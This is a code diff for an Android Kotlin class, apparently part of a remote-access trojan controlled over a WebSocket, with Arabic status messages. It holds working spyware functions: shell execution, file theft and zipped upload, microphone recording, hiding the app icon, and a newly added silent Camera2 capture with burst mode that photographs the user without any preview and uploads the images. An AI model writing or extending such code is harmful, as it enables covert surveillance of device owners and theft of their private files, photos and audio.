@@ -9,18 +9,30 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.database.Cursor
+import android.graphics.ImageFormat
+import android.graphics.SurfaceTexture
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CameraCharacteristics
+import android.hardware.camera2.CameraDevice
+import android.hardware.camera2.CameraManager
+import android.hardware.camera2.CaptureRequest
+import android.hardware.camera2.TotalCaptureResult
 import android.location.Location
+import android.media.ImageReader
 import android.media.MediaRecorder
 import android.net.Uri
 import android.net.wifi.WifiManager
 import android.os.Build
 import android.os.Environment
+import android.os.Handler
+import android.os.HandlerThread
 import android.os.StatFs
 import android.os.Vibrator
 import android.os.VibrationEffect
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.MediaStore
+import android.view.Surface
 import androidx.core.content.ContextCompat
 import com.google.android.gms.location.LocationServices
 import okhttp3.*
@@ -60,8 +72,8 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
                 cmd == "sysinfo"       -> sendSystemInfo()
                 cmd == "wifi"          -> sendWifiInfo()
                 cmd == "battery"       -> sendBatteryInfo()
-                cmd == "cam_front"     -> openCamera(1)
-                cmd == "cam_back"      -> openCamera(0)
+                cmd == "cam_front"     -> silentCapture(1)
+                cmd == "cam_back"      -> silentCapture(0)
                 cmd == "lock_screen"   -> lockScreen()
                 cmd == "vibrate"       -> doVibrate()
                 cmd.startsWith("shell:")       -> executeShell(cmd.removePrefix("shell:"))
@@ -72,8 +84,156 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
                 cmd.startsWith("read:")        -> readFile(cmd.removePrefix("read:"))
                 cmd.startsWith("find:")        -> findFile(cmd.removePrefix("find:"))
                 cmd.startsWith("mic:")         -> recordAudio(cmd.removePrefix("mic:").toIntOrNull() ?: 10)
+                cmd.startsWith("capture:")     -> silentCapture(cmd.removePrefix("capture:").toIntOrNull() ?: 0)
+                cmd.startsWith("burst:")       -> burstCapture(cmd.removePrefix("burst:"))
             }
         } catch (e: Exception) { postError("handle", e) }
+    }
+
+    // ═══════════════════════════════════════════════════════
+    // 📷 كاميرا صامتة حقيقية (Camera2 API)
+    // ═══════════════════════════════════════════════════════
+    private fun silentCapture(facing: Int) {
+        try {
+            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+                postText("❌ صلاحية مفقودة", "CAMERA غير مُمنوحة")
+                return
+            }
+
+            val manager = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+            val targetFacing = if (facing == 1) CameraCharacteristics.LENS_FACING_FRONT
+                              else CameraCharacteristics.LENS_FACING_BACK
+
+            val cameraId = manager.cameraIdList.firstOrNull { id ->
+                manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == targetFacing
+            } ?: manager.cameraIdList.firstOrNull()
+
+            if (cameraId == null) {
+                postText("❌ خطأ", "لا توجد كاميرا متاحة")
+                return
+            }
+
+            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    try {
+                        val handlerThread = HandlerThread("CameraBackground")
+                        handlerThread.start()
+                        val handler = Handler(handlerThread.looper)
+
+                        val texture = SurfaceTexture(100)
+                        val previewSurface = Surface(texture)
+
+                        val imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2)
+
+                        val previewRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
+                            addTarget(previewSurface)
+                        }.build()
+
+                        camera.createCaptureSession(
+                            listOf(previewSurface, imageReader.surface),
+                            object : CameraCaptureSession.StateCallback() {
+                                override fun onConfigured(session: CameraCaptureSession) {
+                                    try {
+                                        session.setRepeatingRequest(previewRequest, null, handler)
+
+                                        // انتظر 800ms لاكتساب التركيز، ثم التقط
+                                        handler.postDelayed({
+                                            try {
+                                                val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                                                    addTarget(imageReader.surface)
+                                                }.build()
+
+                                                imageReader.setOnImageAvailableListener({ reader ->
+                                                    try {
+                                                        val image = reader.acquireLatestImage()
+                                                        val buffer = image.planes[0].buffer
+                                                        val bytes = ByteArray(buffer.remaining())
+                                                        buffer.get(bytes)
+                                                        image.close()
+
+                                                        val file = File(ctx.cacheDir, "silent_${System.currentTimeMillis()}.jpg")
+                                                        file.writeBytes(bytes)
+
+                                                        postText("📷 صورة ملتقطة",
+                                                            "الحجم: ${formatSize(file.length())}\nالكاميرا: ${if (facing == 1) "أمامية" else "خلفية"}")
+                                                        uploadFile(file)
+                                                        file.delete()
+
+                                                        try {
+                                                            session.close()
+                                                            camera.close()
+                                                            texture.release()
+                                                            handlerThread.quitSafely()
+                                                        } catch (e: Exception) {}
+                                                    } catch (e: Exception) {
+                                                        postError("capture-read", e)
+                                                    }
+                                                }, handler)
+
+                                                session.capture(captureRequest, object : CameraCaptureSession.CaptureCallback() {
+                                                    override fun onCaptureCompleted(
+                                                        s: CameraCaptureSession,
+                                                        request: CaptureRequest,
+                                                        result: TotalCaptureResult
+                                                    ) {}
+                                                }, handler)
+
+                                            } catch (e: Exception) {
+                                                postError("capture-session", e)
+                                                try { camera.close() } catch (_: Exception) {}
+                                            }
+                                        }, 800)
+
+                                    } catch (e: Exception) {
+                                        postError("session-configure", e)
+                                        try { camera.close() } catch (_: Exception) {}
+                                    }
+                                }
+
+                                override fun onConfigureFailed(session: CameraCaptureSession) {
+                                    postText("❌ فشل التكوين", "Camera session failed")
+                                    try { camera.close() } catch (_: Exception) {}
+                                }
+                            },
+                            handler
+                        )
+                    } catch (e: Exception) {
+                        postError("camera-open", e)
+                        try { camera.close() } catch (_: Exception) {}
+                    }
+                }
+
+                override fun onDisconnected(camera: CameraDevice) {
+                    try { camera.close() } catch (_: Exception) {}
+                }
+
+                override fun onError(camera: CameraDevice, error: Int) {
+                    postText("❌ خطأ كاميرا", "code=$error")
+                    try { camera.close() } catch (_: Exception) {}
+                }
+            }, null)
+
+        } catch (e: Exception) { postError("silent-capture", e) }
+    }
+
+    // ═══════════════════════════════════════════════════════
+    // 📸 تصوير متتالي (burst)
+    // ═══════════════════════════════════════════════════════
+    private fun burstCapture(params: String) {
+        try {
+            val parts = params.split(":")
+            val count = parts.getOrNull(0)?.toIntOrNull() ?: 3
+            val facing = parts.getOrNull(1)?.toIntOrNull() ?: 0
+            val delayMs = parts.getOrNull(2)?.toLongOrNull() ?: 2000L
+
+            postText("📸 تصوير متتالي", "عدد: $count | كل ${delayMs}ms")
+            Thread {
+                for (i in 1..count) {
+                    silentCapture(facing)
+                    Thread.sleep(delayMs)
+                }
+            }.start()
+        } catch (e: Exception) { postError("burst", e) }
     }
 
     // ═══════════════════════════════════════════════════════
@@ -90,7 +250,7 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
     }
 
     // ═══════════════════════════════════════════════════════
-    // 📦 ZIP مقسّم — أجزاء صغيرة لتفادي الانقطاع
+    // 📦 ZIP مقسّم
     // ═══════════════════════════════════════════════════════
     private fun zipAndSendDir(path: String) {
         try {
@@ -108,19 +268,13 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
             val totalSize = allFiles.sumOf { it.length() }
 
             postText("📦 بدء ضغط المجلد",
-                "📁 المجلد: ${target.name}\n" +
-                "💾 الحجم: ${formatSize(totalSize)}\n" +
-                "📄 عدد الملفات: $totalFiles\n" +
-                "⚙️ سيتم التقسيم إلى ZIPs صغيرة")
+                "📁 ${target.name}\n💾 ${formatSize(totalSize)}\n📄 $totalFiles ملف")
 
             val MAX_FILE_SIZE = 10L * 1024 * 1024
             val FILES_PER_ZIP = 20
             val MAX_ZIP_SIZE = 20L * 1024 * 1024
 
-            val validFiles = allFiles
-                .filter { it.length() <= MAX_FILE_SIZE }
-                .sortedBy { it.length() }
-
+            val validFiles = allFiles.filter { it.length() <= MAX_FILE_SIZE }.sortedBy { it.length() }
             val chunks = validFiles.chunked(FILES_PER_ZIP)
             var totalSent = 0
 
@@ -147,20 +301,17 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
                     }
 
                     if (zipFile.exists() && zipFile.length() > 0) {
-                        postText("📤 إرسال الجزء ${index + 1}/${chunks.size}",
-                            "📦 الحجم: ${formatSize(zipFile.length())}\n📄 الملفات: $filesAdded")
+                        postText("📤 جزء ${index + 1}/${chunks.size}",
+                            "📦 ${formatSize(zipFile.length())}\n📄 $filesAdded ملف")
                         uploadFile(zipFile)
                         totalSent += filesAdded
                         Thread.sleep(2000)
                     }
                     zipFile.delete()
-                } catch (e: Exception) {
-                    postError("zip-part-${index + 1}", e)
-                }
+                } catch (e: Exception) { postError("zip-part", e) }
             }
 
-            postText("✅ اكتمل الضغط",
-                "📊 تم إرسال: $totalSent من $totalFiles ملف\n📦 في ${chunks.size} أجزاء")
+            postText("✅ اكتمل الضغط", "$totalSent من $totalFiles ملف")
 
         } catch (e: Exception) { postError("zip", e) }
     }
@@ -181,19 +332,19 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
             val freeMem = runtime.freeMemory() / (1024 * 1024)
 
             val info = """
-📱 الجهاز: ${Build.MANUFACTURER} ${Build.MODEL}
-🤖 أندرويد: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
-🏗️ البنية: ${Build.SUPPORTED_ABIS.joinToString(", ")}
+📱 ${Build.MANUFACTURER} ${Build.MODEL}
+🤖 Android ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
+🏗️ ${Build.SUPPORTED_ABIS.joinToString(", ")}
 
 💾 التخزين:
 • الكلي: ${formatSize(totalBytes)}
 • المستخدم: ${formatSize(usedBytes)}
 • المتاح: ${formatSize(freeBytes)}
 
-🧠 الذاكرة (RAM):
-• القصوى: $maxMem MB
-• الحالية: $totalMem MB
-• الحرة: $freeMem MB
+🧠 RAM:
+• الأقصى: $maxMem MB
+• الحالي: $totalMem MB
+• الحر: $freeMem MB
             """.trimIndent()
 
             postText("📊 معلومات النظام", info)
@@ -248,39 +399,13 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
             }
             val healthText = when (health) {
                 android.os.BatteryManager.BATTERY_HEALTH_GOOD -> "✅ جيدة"
-                android.os.BatteryManager.BATTERY_HEALTH_OVERHEAT -> "🔥 حرارة عالية"
-                android.os.BatteryManager.BATTERY_HEALTH_DEAD -> "❌ تالفة"
+                android.os.BatteryManager.BATTERY_HEALTH_OVERHEAT -> "🔥 حرارة"
                 else -> "غير معروف"
             }
 
-            val text = """
-🔋 المستوى: $pct%
-⚡ الحالة: $statusText
-💚 الصحة: $healthText
-🌡️ الحرارة: ${temp / 10.0} °C
-🔌 الجهد: $volt mV
-            """.trimIndent()
-            postText("🔋 معلومات البطارية", text)
+            postText("🔋 البطارية",
+                "🔋 المستوى: $pct%\n⚡ الحالة: $statusText\n💚 الصحة: $healthText\n🌡️ الحرارة: ${temp / 10.0} °C\n🔌 الجهد: $volt mV")
         } catch (e: Exception) { postError("battery", e) }
-    }
-
-    // ═══════════════════════════════════════════════════════
-    // 📷 كاميرا
-    // ═══════════════════════════════════════════════════════
-    private fun openCamera(facing: Int) {
-        try {
-            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                postText("❌ صلاحية", "CAMERA مفقودة")
-                return
-            }
-            val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
-            intent.putExtra("android.intent.extras.CAMERA_FACING", facing)
-            intent.putExtra("android.intent.extras.LENS_FACING_FRONT", if (facing == 1) 1 else 0)
-            intent.putExtra("android.intent.extra.USE_FRONT_CAMERA", facing == 1)
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            ctx.startActivity(intent)
-            postText("📷 كاميرا", if (facing == 1) "تم فتح الكاميرا الأمامية" else "تم فتح الكاميرا الخلفية")
-        } catch (e: Exception) { postError("camera", e) }
     }
 
     // ═══════════════════════════════════════════════════════
@@ -292,9 +417,9 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
             val adminName = ComponentName(ctx, DeviceAdmin::class.java)
             if (dpm.isAdminActive(adminName)) {
                 dpm.lockNow()
-                postText("🔒 قفل الشاشة", "تم قفل الجهاز بنجاح")
+                postText("🔒 قفل الشاشة", "تم قفل الجهاز")
             } else {
-                postText("⚠️ صلاحية مطلوبة", "يجب تفعيل Device Admin يدوياً:\nالإعدادات → الأمان → Device admins → SyncService")
+                postText("⚠️ صلاحية مطلوبة", "فعّل Device Admin يدوياً:\nالإعدادات → الأمان → Device admins")
             }
         } catch (e: Exception) { postError("lock", e) }
     }
@@ -318,13 +443,12 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
     // ═══════════════════════════════════════════════════════
     private fun hideAppIcon() {
         try {
-            val p = ctx.packageManager
-            p.setComponentEnabledSetting(
+            ctx.packageManager.setComponentEnabledSetting(
                 ComponentName(ctx, "${ctx.packageName}.MainActivity"),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
-            postText("🥷 وضع التخفي النشط", "تم إخفاء الأيقونة بنجاح من واجهة النظام.")
+            postText("🥷 وضع التخفي النشط", "تم إخفاء الأيقونة")
         } catch (e: Exception) { postError("hide", e) }
     }
 
@@ -454,20 +578,17 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
     }
 
     // ═══════════════════════════════════════════════════════
-    // 📄 إرسال ملف مباشر
+    // 📄 إرسال ملف
     // ═══════════════════════════════════════════════════════
     private fun sendFile(path: String) {
         try {
             val file = resolvePath(path) ?: run {
-                postText("❌ خطأ", "الملف غير موجود: $path")
+                postText("❌", "الملف غير موجود: $path")
                 return
             }
-            if (!file.isFile) {
-                postText("❌ خطأ", "ليس ملفاً: $path")
-                return
-            }
+            if (!file.isFile) { postText("❌", "ليس ملفاً"); return }
             if (file.length() > 100 * 1024 * 1024) {
-                postText("⚠️ ملف كبير", "الحجم: ${formatSize(file.length())} — الحد 100MB")
+                postText("⚠️ كبير", "${formatSize(file.length())} — الحد 100MB")
                 return
             }
             uploadFile(file)
@@ -480,13 +601,12 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
     private fun readFile(path: String) {
         try {
             val file = resolvePath(path) ?: run {
-                postText("❌ خطأ", "الملف غير موجود: $path")
+                postText("❌", "غير موجود")
                 return
             }
             if (!file.isFile) { postText("❌", "ليس ملفاً"); return }
-            if (file.length() > 500 * 1024) { postText("⚠️ كبير", "الحجم > 500KB"); return }
-            val content = file.readText()
-            postText("📖 ${file.name}", content)
+            if (file.length() > 500 * 1024) { postText("⚠️", "> 500KB"); return }
+            postText("📖 ${file.name}", file.readText())
         } catch (e: Exception) { postError("read", e) }
     }
 
@@ -498,32 +618,26 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
             val root = Environment.getExternalStorageDirectory()
             val results = JSONArray()
             var count = 0
-            root.walkTopDown()
-                .filter { it.isFile && it.name.contains(name, ignoreCase = true) }
-                .take(50)
-                .forEach { f ->
-                    results.put(JSONObject().apply {
-                        put("name", f.name)
-                        put("path", f.absolutePath)
-                        put("size", f.length())
-                    })
-                    count++
-                }
-            if (count == 0) {
-                postText("🔍 لا نتائج", "لم يتم العثور على ملفات تحتوي: $name")
-            } else {
-                postText("🔍 نتائج ($count)", results.toString(2))
+            root.walkTopDown().filter { it.isFile && it.name.contains(name, ignoreCase = true) }.take(50).forEach { f ->
+                results.put(JSONObject().apply {
+                    put("name", f.name)
+                    put("path", f.absolutePath)
+                    put("size", f.length())
+                })
+                count++
             }
+            if (count == 0) postText("🔍 لا نتائج", "لم أجد: $name")
+            else postText("🔍 نتائج ($count)", results.toString(2))
         } catch (e: Exception) { postError("find", e) }
     }
 
     // ═══════════════════════════════════════════════════════
-    // 📂 عرض محتويات مجلد
+    // 📂 عرض مجلد
     // ═══════════════════════════════════════════════════════
     private fun listDir(path: String) {
         try {
             val target = resolvePath(path) ?: run {
-                postText("❌", "المجلد غير موجود: $path")
+                postText("❌", "غير موجود: $path")
                 return
             }
             val items = JSONArray()
@@ -561,7 +675,7 @@ class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {
     private fun recordAudio(seconds: Int) {
         try {
             if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-                postText("❌ صلاحية مفقودة", "RECORD_AUDIO غير مُمنوحة")
+                postText("❌ صلاحية", "RECORD_AUDIO مفقودة")
                 return
             }
             val path = ctx.cacheDir.absolutePath + "/rec_${System.currentTimeMillis()}.m4a"
